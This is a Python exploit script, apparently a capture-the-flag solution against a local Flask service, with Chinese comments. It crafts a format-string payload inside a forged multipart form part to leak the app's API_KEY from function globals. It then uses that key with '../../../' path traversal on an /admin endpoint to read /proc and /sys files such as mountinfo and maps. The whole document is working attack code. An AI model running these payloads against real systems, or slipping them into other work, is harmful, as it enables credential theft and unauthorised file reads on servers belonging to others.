import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=5.0)
    return r.text, r.status_code

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 尝试读取各种目录相关的路径
paths = [
    # 尝试读取目录（这通常会失败，因为 open() 不能读取目录）
    '../../../',
    '../../../proc/self/root/',
    '../../../proc/self/root',
    
    # 但是... /proc 有一些特殊的文件可能能泄露信息
    '../../../proc/mounts',
    '../../../proc/filesystems',
    '../../../proc/partitions',
    
    # /proc/self/maps 可能有用
    '../../../proc/self/maps',
    
    # /proc/self/mountinfo
    '../../../proc/self/mountinfo',
    
    # /proc/self/task/
    '../../../proc/self/task',
    
    # /sys 目录
    '../../../sys/kernel/hostname',
]

for p in paths:
    content, status = read_file_via_admin(api_key, p)
    print(f"\n[{p}] Status: {status}")
    if status == 200:
        print(content[:1000])
